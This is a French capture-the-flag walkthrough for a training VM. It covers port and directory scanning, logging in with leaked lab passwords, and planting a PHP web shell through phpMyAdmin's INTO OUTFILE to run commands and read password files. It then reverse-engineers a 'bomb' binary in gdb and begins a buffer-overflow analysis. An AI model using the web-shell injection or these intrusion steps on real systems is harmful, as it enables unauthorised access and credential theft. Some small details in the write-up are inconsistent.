# Bombe

1. [Etape Forum](#forum)
2. [Etape Laurie](#laurie)
3. [Etape Thor](#thor)
4. [Etape Zaz](#zaz)

## Scan les ports d'ouverts :

Recuperer l'adresse de la VM dans "Host Network Manager", et Scann les ports d'ouverts avec :
```
nmap $(adresse ip)
```
par exemple :
```
nmap 192.168.56.101
```
On obtiendra :
```
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 10:13 UTC
Nmap scan report for 192.168.56.101
Host is up (1.0s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

Tips : On peut aussi check une range d'ip avec par exemple :
`nmap 192.18.56.1-24`

Suite au résultat de nmap, on peut aller sur un navigateur à l'adresse ip. Un site web se charge sur le port 80.
Par exemple, dans le navigateur :
```
http://192.168.56.101:80
```
(80 est le port par défaut, donc pas forcément besoin de le mettre dans l'url)
=> mais on a aucun indice sur cette page so far


# Forum <a name="forum"></a>

Maintenant, on peut essayer le port 443 qui est aussi ouvert.
En requêtant notre VM avec 443 (`http://192.168.56.101:443/`), on lit un message d'erreur: requêter en faisant `https://<ip>` plutôt que de renseigner le port 443.

Faire `https://192.168.56.101/` nous amène à une page 404 Not Found. On est bien sur la machine, mais pas sur la bonne route.

Il est maintenant intéressant ici d'utiliser `dirb` pour trouver les urls :
`dirb https://192.168.56.101`

```
root@3899c1258a65:/# dirb https://192.168.56.101

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May  1 14:24:35 2019
URL_BASE: https://192.168.56.101/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.56.101/ ----
+ https://192.168.56.101/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.56.101/forum/
==> DIRECTORY: https://192.168.56.101/phpmyadmin/
+ https://192.168.56.101/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.56.101/webmail/

[...]
```

L'URL `/forum` et d'autres ressortent...

=> `https://<ip>/forum` est accessible!

## Se connecter sur le forum

Aller dans la page "Problem login ?" et rechercher 'lmezard'

Sur une des lignes au dessus on voit ce qui ressemble a un mdp : `!q\]Ej?*5K5cy*AJ`
Il s'agit du login de lmezard pour le forum.

On se connecte donc au forum sur `https://<ip>/forum/index.php?mode=login` avec :
```
login: lmezard
mdp: !q\]Ej?*5K5cy*AJ
```

## Se connecter sur le webmail

url : `https://<ip>/webmail`

Prérequis : se log sur le forum avec le compte de lmezard.

En allant sur son compte (`https://192.168.56.101/forum/index.php?mode=user&action=edit_profile` ou onglet 'lmezard' en haut) on voit son adresse mail : laurie@borntosec.net

Le mot de passe du webmail est le meme que celui du forum

## Se connecter sur PhpMyAdmin

Sur le webmail aller dans le mail "DB Access". Les accès sont donnés :

url : `https://<ip>/phpmyadmin`
login : root
password : `Fg-'kKXBj87E:aJ$`

## Trouver la première bombe :

Une fois connecté sur la DB...

## Uploader des scripts via la BDD

Une fois l'accès à la BDD via "phpMyadmin" trouvé, on exploite la faille de sécurité qui consiste à écrire des fichiers, script php sur le server.

Le framework [mylittleforum](https://github.com/ilosuna/mylittleforum/wiki/Installation) a un fichier dans son arborescence en écriture. On va pouvoir donc écrire les scripts ici:
`https://<ip>/forum/templates_c/`  
Tips : on sait qu'on est sur un site de type mylittleforum car présent dans le footer du site.

Dans la console phpMyadmin, onglet MySQL, on copie la ligne suivante pour injecter un fichier sur le serveur, nous permettant de lancer des commandes via l'URL (ex: ls)

`SELECT "<?php system(' '.$_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/all.php"`

## Exploration du server

Voici comment, en passant des arguments dans l'url, on utilise nos scripts:
- ex: https://192.168.56.101/forum/templates_c/all.php?cmd=ls
- ex: https://192.168.56.101/forum/templates_c/all.php?cmd=ls%20-la%0A

On peut utiliser le site suivant pour encoder les commandes, notamment celles avec des espaces : http://www.utilities-online.info/urlencode/#.XPpUmpMzZBy

En se promenant sur le server, on trouve un login et un mot de passe : 

Commande : `https://192.168.56.101/forum/templates_c/all.php?cmd=cat%20/home/LOOKATME/password%0A`

Login et mdp : `lmezard:G!@M6f4Eatau{sF"`

Le scan des ports, préalablement réalisé, nous montrait qu'il y avait sur la VM un server FTP, c'est un peu par hasard et par chance qu'on utilise ces identifiants sur celui-ci et qu'on en obtient l'accès.

## Connection au serveur FTP

Connection au serveur `ftp` (depuis notre conteneur Kali, ou en local):

```
> ftp 192.168.56.101

Name (192.168.56.101:root): lmezard
331 Please specify the password.
Password:
230 Login successful
```
On passe en mode passif (là, c'est juste une histoire de port, le serveur décide du port sur lequel on écoute).
```
ftp> pass
Passive mode on.
ftp> dir
227 Entering Passive Mode (192,168,56,101,171,238)
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
226 Directory send OK.
```

On trouve 2 fichiers qu'on va pouvoir récupérer.
```
ftp> get README
local: README remote: README
227 Entering Passive Mode (192,168,56,101,202,228)
150 Opening BINARY mode data connection for README (96 bytes).
226 Transfer complete.
96 bytes received in 0.00 secs (146.2559 kB/s)

ftp> get fun
local: fun remote: fun
227 Entering Passive Mode (192,168,56,101,216,67)
150 Opening BINARY mode data connection for fun (808960 bytes).
226 Transfer complete.
808960 bytes received in 0.02 secs (47.1856 MB/s)
```

## Résoudre le challenge

On lit:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

Le fichier fun est en fait une archive, un tar permet de la décompresser, `tar -xvf fun`, elle contient 750 fichiers, avec l'extension `.pcap`, des paquets réseaux (_pcap files are data files created using the program and they contain the packet data of a network_).

Chacun de ces fichiers contient un peu de code C, et un numéro de fichier. On fait un petit script shell (parce que pourquoi pas) `challenge1.sh` pour les trier dans l'ordre.

Pour copier le script sur un Docker, lancer depuis la machine host (le mac ou une machine Docker) la commande:  
`docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH`  

Le script est à utiliser dans le même dossier que le dossier de l'archive (qui s'appelle `ft_fun`) et on affiche:
```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

Sha 256:  
```
echo -n "Iheartpwnage" | openssl dgst -sha256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```  

Puis connection ssh avec le user laurie et le mot de passe trouvé sur un terminal en local:
`ssh laurie@<ip>`

# LAURIE <a name="laurie"></a>

## Désamorcer la bomb
On va faire de l'assembleur ! ça va bien se passer...  [petit mémo](https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf)  
Des petits outils avant de commencer:  
	- `strings bomb`: le otool de linux  
	- `nm bomb`  

Quelques tests plus tard, on voit que le binaire comporte 6 "phases", une phase étant un input utilisateur à entrer pour passer à la suivante.

### Phase 1:
1. gdb ./bomb
2. disass phase_1
```asm
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:	push   %ebp
   0x08048b21 <+1>:	mov    %esp,%ebp
   0x08048b23 <+3>:	sub    $0x8,%esp
   0x08048b26 <+6>:	mov    0x8(%ebp),%eax
   0x08048b29 <+9>:	add    $0xfffffff8,%esp
   0x08048b2c <+12>:	push   $0x80497c0
   0x08048b31 <+17>:	push   %eax
   0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:	add    $0x10,%esp
   0x08048b3a <+26>:	test   %eax,%eax
   0x08048b3c <+28>:	je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:	call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:	mov    %ebp,%esp
   0x08048b45 <+37>:	pop    %ebp
   0x08048b46 <+38>:	ret
End of assembler dump.
```
3. On remarque un nom de fonction "strings_not_equal", il va y avoir une comparaison de strings (pas besoin de désassembler plus loin ^^), essayons de trouver la string avec laquelle sera comparé notre input.
4. On remarque qu'il a un push de la valeur située à l'addresse 0x80497c0 (ligne 12).
`x /s 0x80497c0` nous donne: `0x80497c0:	 "Public speaking is very easy."`
5. `run` le programme et ajouter cette phrase dans l'input de la phase 1 et c'est bon. 

### Phase 2

Toujours dans gdb...

Faire `disass phase_2`
```asm
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:	push   %ebp
	[...]
   0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:	add    $0x10,%esp
   0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)
   0x08048b67 <+31>:	je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:	call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:	mov    $0x1,%ebx
   0x08048b73 <+43>:	lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:	lea    0x1(%ebx),%eax
   0x08048b79 <+49>:	imul   -0x4(%esi,%ebx,4),%eax
   0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)
   0x08048b81 <+57>:	je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:	call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:	inc    %ebx
   0x08048b89 <+65>:	cmp    $0x5,%ebx
   0x08048b8c <+68>:	jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:	lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:	pop    %ebx
   0x08048b92 <+74>:	pop    %esi
   0x08048b93 <+75>:	mov    %ebp,%esp
   0x08048b95 <+77>:	pop    %ebp
   0x08048b96 <+78>:	ret
```

#### Dans quel format devons nous envoyer l'input des 6 nombres ?

Mettre un breakpoint sur read_six_numbers : `break read_six_number`

Faire un `disass read_six_numbers` :
```asm
   0x08048fd8 <+0>:	push   %ebp
   0x08048fd9 <+1>:	mov    %esp,%ebp
	[...]
   0x08048ff8 <+32>:	push   %edx
   0x08048ff9 <+33>:	push   $0x8049b1b
   0x08048ffe <+38>:	push   %ecx
   0x08048fff <+39>:	call   0x8048860 <sscanf@plt>
   0x08049004 <+44>:	add    $0x20,%esp
	[...]
   0x08049013 <+59>:	pop    %ebp
   0x08049014 <+60>:	ret
```

On voit un sscanf ligne 33.  
Il serait intéressant de trouver les arguments passés pour avoir le format de l'input (cf ligne 33) :
```
(gdb) x/s 0x8049b1b
0x8049b1b:	 "%d %d %d %d %d %d"
```

#### Trouver les inputs

En se basant sur le `disass phase_2` :

- Focus sur la ligne 27 : `0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)`  
Faire un breakpoint sur cette ligne (`break *0x08048b63`) puis run.  
Afficher le second paramètre : `x/s $ebp - 0x18`  
=> On remarque ici notre premier nombre en input  
=> On a donc ici, on a une comparaison de premier nombre en input avec le chiffre `0x1`  
=> Le premier nombre est donc 1

- Focus sur la ligne 54 : `0x08048b7e <+54>:	cmp    %eax,(%esi,%ebx,4)`  
On voit que cette comparaison se fait dans une boucle car, ligne 65, il y a une nouvelle comparaison qui ramène conditionnellement à la ligne 46.  
Quand on imprime le second paramètre :
```x/d $esi + $ebx * 4```  
on obtient notre second nombre en input.  
Et en faisant `i r`, on remarque le premier paramètre (`eax`) vaut 2.  
=> Le second nombre est donc 2.
En répétant cette étape et en laissant le breakpoint, on peut accéder à tous les nombres.

La seconde answer est `1 2 6 24 120 720`.

### Phase 3
#### Format attendu
De la même manière que pour la phase précédente, on trouve un sscanf et un input de cet forme :
```
%d %c %d
```

#### Trouver l'input

Sur gdb, `disass phase_3` :
```asm
Dump of assembler code for function phase_3:
   0x08048b98 <+0>:	push   %ebp
	[...]
   0x08048bb0 <+24>:	push   %eax
   0x08048bb1 <+25>:	push   $0x80497de
   0x08048bb6 <+30>:	push   %edx
   0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:	add    $0x20,%esp
   0x08048bbf <+39>:	cmp    $0x2,%eax
   0x08048bc2 <+42>:	jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:	call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
   0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:	mov    -0xc(%ebp),%eax
   0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
   0x08048bdd <+69>:	lea    0x0(%esi),%esi
	   [...]
   0x08048bf9 <+97>:	lea    0x0(%esi,%eiz,1),%esi
   0x08048c00 <+104>:	mov    $0x62,%bl
   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
	   [...]
   0x08048c88 <+240>:	mov    $0x78,%bl   
   0x08048c8a <+242>:	call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:	call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:	mov    -0x18(%ebp),%ebx
   0x08048c9c <+260>:	mov    %ebp,%esp
   0x08048c9e <+262>:	pop    %ebp
   0x08048c9f <+263>:	ret
```

- Focus ligne 49-50 :  
```asm
0x08048bc9 <+49>:	cmpl   $0x7,-0xc(%ebp)
0x08048bcd <+53>:	ja     0x8048c88 <phase_3+240>
[...]
```
=> Ici, il compare notre premier argument d'input au chiffre 7.  
En dessous on a un jump conditionnel qui nous envoie à un explode_bomb si notre premier imput est un nombre inférieur ou egal à 7 (de manière non signée).  
Sinon, on continue.

Nous allons donc tester avec le chiffre 1.

- Juste en dessous, il y a un jump => focus sur la ligne 62 :
```asm
   0x08048bd6 <+62>:	jmp    *0x80497e8(,%eax,4)
```
quand on affiche cette adressse dans gdb :
```asm
(gdb) x/d $eax * 4 + 0x80497e8
0x80497ec:	134515712
```
=> `134515712 = 0x8048c00`  

- Le jump nous amène donc à l'adresse `0x8048c00`.  
Nous avons ces lignes :
```asm
   0x08048c00 <+104>:	mov    $0x62,%bl
   0x08048c02 <+106>:	cmpl   $0xd6,-0x4(%ebp)
   0x08048c09 <+113>:	je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:	call   0x80494fc <explode_bomb>
```
On voit ici que nous avons une comparaison entre notre 3ème input (`-0x4(%ebp)`) et le nombre `0xd6 = 214`.  
Si ce n'est pas le cas, la bombe explose.  
Sinon, on saute à la ligne 247.

- Focus sur la ligne 247 :
```asm
   0x08048c8f <+247>:	cmp    -0x5(%ebp),%bl
   0x08048c92 <+250>:	je     0x8048c99 <phase_3+257>
```
Ici, comparaison entre:  
	- notre 2ème argument d'input (le char, visible avec la commande `x/c $ebp - 0x05`)  
	- et le charactère 'b' avec la commande `x/c $bl` qui donne `0x62 = 98 = 'c'`

On comprend donc que le résultat attendu est `1 b 214`

Quand on regarde mieux le code, on comprend qu'il existe plusieurs possibilités de réponses. En effet, au premier `cmp`, le programme attend (en 1er input) un chiffre inférieur ou égal à 7.    
En fonction de la réponse, le jump va se faire à différentes adresses qui vont nous amener à différentes comparaisons.    
Voici les possibiltés de réponses :
```
0 q 777
1 b 214
2 b 755
3 k 251
4 o 160
5 t 458
6 v 780
7 b 524
```

### Phase 4

#### Analyse phase_4

```asm
Dump of assembler code for function phase_4:
			[...]
   0x08048cf0 <+16>:	push   $0x8049808
			[...]
   0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
			[...]
   0x08048cfe <+30>:	cmp    $0x1,%eax
   0x08048d01 <+33>:	jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:	cmpl   $0x0,-0x4(%ebp)
   0x08048d07 <+39>:	jg     0x8048d0e <phase_4+46>
			[...]
   0x08048d14 <+52>:	push   %eax
   0x08048d15 <+53>:	call   0x8048ca0 <func4>
   0x08048d1a <+58>:	add    $0x10,%esp
   0x08048d1d <+61>:	cmp    $0x37,%eax
   0x08048d20 <+64>:	je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:	call   0x80494fc <explode_bomb>
			[...]
   0x08048d2a <+74>:	ret
End of assembler dump.
```

1. `x/s 0x8049808` nous donne "%d" : On attend un int en input. `-0x4(%ebp)` est notre input.
2. `cmp    $0x1,%eax` : On vérifie ici qu'on a bien un argument sinon la bombe explose.
3. `cmpl   $0x0,-0x4(%ebp)` : Si l'input est plus grand que 0, alors c'est ok,
sinon sinon la bombe explose.
4. On push notre input dans le registre eax, et eax sur la stack pour appeler func4 en lui passant notre input en paramètre.
5. `cmp    $0x37,%eax` : On compare ensuite le retour de cette fonction qui doit être 0x37, soit *55* pour qu'on puisse valider cette étape.

#### Analyse func4

```asm
Dump of assembler code for function func4:
			[...]
   0x08048cab <+11>:	cmp    $0x1,%ebx
   0x08048cae <+14>:	jle    0x8048cd0 <func4+48>
			[...]
   0x08048cb3 <+19>:	lea    -0x1(%ebx),%eax
   0x08048cb6 <+22>:	push   %eax
   0x08048cb7 <+23>:	call   0x8048ca0 <func4>
   0x08048cbc <+28>:	mov    %eax,%esi
			[...]
   0x08048cc1 <+33>:	lea    -0x2(%ebx),%eax
   0x08048cc4 <+36>:	push   %eax
   0x08048cc5 <+37>:	call   0x8048ca0 <func4>
   0x08048cca <+42>:	add    %esi,%eax
			[...]
   0x08048cdd <+61>:	ret
End of assembler dump.
```
1. On arrive dans func4, il faut récupérer notre paramètre via le registre esp. `mov    0x8(%ebp),%ebx` : On récupère notre input dans ebx.
2. `cmp    $0x1,%ebx` : On compare notre input et 1. jle -> less than or equal
to 1. Si c'est le cas, on jump à <func4+48>. on `mov $0x1,%eax` et ça return (c'est en fait la condition d'arrêt des appels récursifs qui vont suivre !).
3. `lea -0x1(%ebx),%eax` on affecte à eax notre input - 1,  et on relance func4. Avec `mov    %eax,%esi` : On met le résultat obtenu dans le registre esi. Ainsi, un nouvel appel à func4 n'écrasera pas la valeur obtenue.
4. On rappelle func4 avec notre input - 2, `lea -0x2(%ebx),%eax`.
`add    %esi,%eax` on somme les registres esi et eax, soit func4(input -1) +
func4(input -2), et ce résultat est retourné.

A partir de là, on sait qu'on doit trouver _f(x - 1) + f(x - 2) = 55_.
On reconnait la suite de Fibonacci dont le 9ème terme donne *55*.  
Réponse: `9` !

### Phase 5

Apres un petit `disass phase_5`, on obtient l'ASM suivant : 

```asm
   [...]
   0x08048d43 <+23>:	cmp    $0x6,%eax
   [...]
   0x08048d72 <+70>:	push   $0x804980b
   [...]
   0x08048d7a <+78>:	push   %eax
   0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>
   [...]
```

L'instruction 23 nous indique une comparaison de $eax avec le chiffre 6. La réponse doit contenir 6 caractères. 
On set un breakpoint à l'instruction 70, et on affiche ce qui est contenu à l'instruction 70. On obtient le mot "giants" : 

```asm
(gdb) x/s 0x804980b
0x804980b:	 "giants"
```

On essaie de rentrer giants en réponse, cela ne fonctionne pas. On set alors un breakpoint plus bas, à l'instruction 79, et en printant $eax on obtient `hbsfev`. On comprend alors que chaque lettre a une correspondance. Cela ne correspond pas à un rotN, on décide alors d'établir une table de correspondance : 

```
a -> s
b -> r
c -> v
d -> e
e -> a
f -> w
g -> h
h -> o
i -> b
j -> p
k -> n
l -> u
m -> t
n -> f
o -> g
p -> i
q -> s
r -> r
s -> v
t -> e
u -> a
v -> w
w -> h
x -> o
y -> b
z -> p
```

On effectue alors la conversion de `giants` et on obtient 2 possibilités : `opekma` et `opukma`, car la lettre 'a' a deux correspondances possibles. Les deux possibilités fonctionnent !

Réponses : 
`opekma`
`opukma`
`opekmq`
`opukmq`

### Phase 6

On desassemble la phase_6, et on obtient l'ASM suivant :
```asm
Dump of assembler code for function phase_6:
[...]
   0x08048da4 <+12>:	movl   $0x804b26c,-0x34(%ebp)
[...]
   0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
[...]
   0x08048dc6 <+46>:	dec    %eax
   0x08048dc7 <+47>:	cmp    $0x5,%eax
[...]
   0x08048de6 <+78>:	mov    -0x38(%ebp),%edx
   0x08048de9 <+81>:	mov    (%edx,%esi,1),%eax
   0x08048dec <+84>:	cmp    (%esi,%ebx,4),%eax
[...]
   0x08048e73 <+219>:	mov    (%esi),%eax
   0x08048e75 <+221>:	cmp    (%edx),%eax
[...]
End of assembler dump.
```

On constate le retour de la fonction `read_six_numbers`. Notre format d'output doit donc être `%d %d %d %d %d %d`. 

Les instructions 46 et 47 nous indique les nombres attendus doivent être inférieurs ou égaux à 6 (on compare un 5 que l'on a précédemment décrémenté). On rentre 6 fois dans cette boucle donc c'est bien tous nos nombres qui doivent se soumettre à cette condition.


#### Méthode 1 : le script

Grâce aux indices dans le README, on sait que le premier chiffre est un 4.  
À partir des infos récupérées jusque là, on sait que les 6 inputs sont des nombres entre 1 et 6 et tous différents.  
Il y a donc 120 possibilités. Un script est envisageable.

On récupère les 120 permutations possibles sur un site qui nous les génère, par exemple [ici](https://www.dcode.fr/generateur-permutations).

On copie les fichiers nécessaires sur la VM (depuis notre machine locale) :
```bash
$> scp ./bomb/phase_6_possibilities laurie@192.168.56.101:/home/laurie
$> scp ./bomb/find_phase_6.sh laurie@192.168.56.101:/home/laurie
```
Puis, depuis la VM, on lance notre script :
```bash
$> bash find_phase_6.sh
LINE = 4 1 2 3 5 6
	[...]
LINE = 4 6 2 3 1 5
LINE = 4 2 6 3 1 5
Found !
```
L'input attendu est donc `4 2 6 3 1 5`.


#### Méthode 2 : la logique du code asm

Ici, on se focus de nouveau sur le `disass phase_6`.

L'instruction 84 compare 2 de nos chiffres, et fait exploser la bombe si ces deux nombres sont égaux. On passe 6 fois dans cette même boucle donc tous nos nombres doivent être différents.

On set un breakpoint à l'instruction 221, et on print esi, qui est en fait une liste chaînée : `x/3x $esi`
```asm
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
```

Le node 1 est donc à l'adresse `0x804b26c` (que l'on retrouve à l'instruction 12), et contient 3 informations : `0x000000fd` (une valeur dont on ne connait pas encore l'utilité), `0x00000001` (une partie de la réponse), et `0x0804b260` qui est l'adresse du prochain maillon. 
On peut donc parcourir tous les maillons avec `x/3x $adresse` : 
```asm
0x804b26c <node1>:	0x000000fd	0x00000001	0x0804b260
0x804b260 <node2>:	0x000002d5	0x00000002	0x0804b254
0x804b254 <node3>:	0x0000012d	0x00000003	0x0804b248
0x804b248 <node4>:	0x000003e5	0x00000004	0x0804b23c
0x804b23c <node5>:	0x000000d4	0x00000005	0x0804b230
0x804b230 <node6>:	0x000001b0	0x00000006	0x00000000
```

On retrouve bien dans la 2 ème colonne nos 6 nombres de 1 à 6 qui constituent la réponse. On suppose alors que la première colonne sert à nous indiquer l'ordre. Il s'agit d'hexadecimal, on le transforme alors en décimal : 

```asm
<node1>:	0x000000fd -> 253
<node2>:	0x000002d5 -> 725
<node3>:	0x0000012d -> 301
<node4>:	0x000003e5 -> 997
<node5>:	0x000000d4 -> 212
<node6>:	0x000001b0 -> 432 
```

On sait grâce au Hint dans le README que le premier chiffre est un 4. La retranscription ci-dessus nous indique qu'il s'agit du chiffre le plus élevé. On essaie alors de les ordonner par ordre décroissant : 

```markdown
| 997 | 725 | 432 | 301 | 253 | 212
|  4  |  2  |  6  |  3  |  1  |  5
```

On essaie et... cela fonctionne ! 

Réponse : `4 2 6 3 1 5`

### Secret Phase

#### Activer la phase secrète

```asm
Dump of assembler code for function phase_defused:
                           [...]
   0x08049544 <+24>: push   $0x8049d03
   0x08049549 <+29>: push   $0x804b770
   0x0804954e <+34>: call   0x8048860 <sscanf@plt>
                           [...]
   0x08049564 <+56>: call   0x8049030 <strings_not_equal>
                           [...]
   0x08049585 <+89>: call   0x8048810 <printf@plt>
   0x0804958a <+94>: add    $0x20,%esp
   0x0804958d <+97>: call   0x8048ee8 <secret_phase>
                           [...]
End of assembler dump.
```

En faisant un `disass phase_defused`, on remarque l'appel à une fonction "secret_phase" dans laquelle on ne passe jamais pour le moment. On remarque 2 push sur la stack avant l'appel de cette fonction:
```asm
   0x08049544 <+24>: push   $0x8049d03 --> "%d %s"
   0x08049549 <+29>: push   $0x804b770 --> "9"
```
Pour entrer dans la secret_phase, il faudrait alors entrer un chiffre suivi d'une string.  
On investigue du côté des strings présentes dans le binaires avec `strings bomb` et on lit:
```
%d %s
austinpowers
Curses, you've found the secret phase!
But finding it and solving it are quite different...
Congratulations! You've defused the bomb!
```
La string `austinpowers` qui arrive juste après le formattage attendu dans les strings nous parrait être le candidat idéal. On teste d'ajouter cette string à la suite de chacune de nos réponses, et c'est le `9`, la réponse de la phase 4 qui va nous permettre d'activer la secret_phase.
`9 austinpowers`
Une nouvelle énigme est alors à résoudre...

#### Résoudre l'énigne

##### secret_phase
```asm
Dump of assembler code for function secret_phase:
                           [...]
   0x08048eef <+7>:  call   0x80491fc <read_line>
                           [...]
   0x08048efb <+19>: call   0x80487f0 <__strtol_internal@plt>
                           [...]
   0x08048f08 <+32>: cmp    $0x3e8,%eax
   0x08048f0d <+37>: jbe    0x8048f14 <secret_phase+44>
   0x08048f0f <+39>: call   0x80494fc <explode_bomb>
                           [...]
   0x08048f17 <+47>: push   %ebx
   0x08048f18 <+48>: push   $0x804b320
   0x08048f1d <+53>: call   0x8048e94 <fun7>
   0x08048f22 <+58>: add    $0x10,%esp
   0x08048f25 <+61>: cmp    $0x7,%eax
   0x08048f28 <+64>: je     0x8048f2f <secret_phase+71>
   0x08048f2a <+66>: call   0x80494fc <explode_bomb>
                           [...]
End of assembler dump.
```
1. Un premier appel à `readline` va récupérer notre input, qui est ensuite converti en long integer avec `strtol` (string to long integer)
2.
```asm
lea    -0x1(%ebx),%eax
cmp    $0x3e8,%eax
```  
-> comparaison de notre (input - 1) à 1000, si il est inférieur ou égal, on avance.
3. On fait du brutforce avec notre script en testant tous les nombres entre 0 et 1001  
```bash
$> bash find_secret_phase.sh
TRY = 0
[...]
TRY = 1000
TRY = 1001
Found !
```

La réponse est `1001`.

# THOR <a name="thor"></a>

## Se ssh en tant que Thor

On concatène les précédents résultats (sans la secret phase) et on obtient :  
`Publicspeakingisveryeasy.126241207201b2149opekmq426135`  
Tips : inversion des deux derniers caractères, cf [forum-intra](https://forum.intra.42.fr/topics/17158/messages/1#81289)

Donc :  
```bash
$> ssh thor@<ip>
```

### turtle 🐢

Dans le /home, on trouve fichier de 1400 instructions du type:
```
Avance 1 spaces
Tourne droite de 1 degrees
```
On prend un papier, un stylo, et on "suit" le parcours indiqué pour trouver `SLASH`
Plusieurs algorithme de hash, plus tard, on trouve le mot de passe de la session avec `md5`:
```bash
echo -n "SLASH" | openssl dgst -md5
646da671ca01bb5d84dbb5fb2238dc8e
```
On peut donc maintenant se connecter en tant que zaz: `ssh zaz@<ip>`

# ZAZ <a name="zaz"></a>

On trouve un binaire `exploit_me` à la racine, et un dossier mail. On suit la piste évidente du binaire.
Le binaire appartient à `root`. Il prend une chaine de caractère en paramètre et la print.
```asm
disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:	push   ebp
   0x080483f5 <+1>:	mov    ebp,esp
   0x080483f7 <+3>:	and    esp,0xfffffff0
   0x080483fa <+6>:	sub    esp,0x90
   0x08048400 <+12>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    eax,0x1
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048410 <+28>:	add    eax,0x4
   0x08048413 <+31>:	mov    eax,DWORD PTR [eax]
   0x08048415 <+33>:	mov    DWORD PTR [esp+0x4],eax
   0x08048419 <+37>:	lea    eax,[esp+0x10]
   0x0804841d <+41>:	mov    DWORD PTR [esp],eax
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    eax,[esp+0x10]
   0x08048429 <+53>:	mov    DWORD PTR [esp],eax
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    eax,0x0
   0x08048436 <+66>:	leave
   0x08048437 <+67>:	ret
End of assembler dump.
```
Le binaire segfault si on lui passe une chaine de caractère trop longue. On en déduit qu'on est dans un cas de *Buffer Overflow* à exploiter.  

La longueur de la chaine qui fait segfault le programme est de 140 caractères.  
On trouve cette taille par 2 moyens:
1. en itérant:
```bash
./exploit_me $(python -c 'print("A" * 141)')
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
2. ou [en regardant les adresses des registres](https://0xrick.github.io/binary-exploitation/bof5/) `eip` et `esi`:  
On lance notre programme dans **gdb** avec: `run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`  
On récupère l'adresse d'`eip` avec *info frame*:  
```
(gdb) info frame
Stack level 0, frame at 0xbffff6d0:
 eip = 0x8048436 in main; saved eip 0xbffff680
 Arglist at 0xbffff6c8, args:
 Locals at 0xbffff6c8, Previous frame's sp is 0xbffff6d0
 Saved registers:
  ebp at 0xbffff6c8, eip at 0xbffff6cc
```
On affiche 24 mots à partir de l'adresse `esp` pour voir le début de notre buffer (rappel ici, A = 41):
```
(gdb) x/24wx $esp
0xbffff630:	0xbffff680	0xbffff8db	0x00000001	0xb7ec3c49
0xbffff640:	0x41414100	0x41414141	0x41414141	0x41414141
0xbffff650:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff660:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff670:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff680:	0x41414141	0x41414141	0x41414141	0x08040041
```
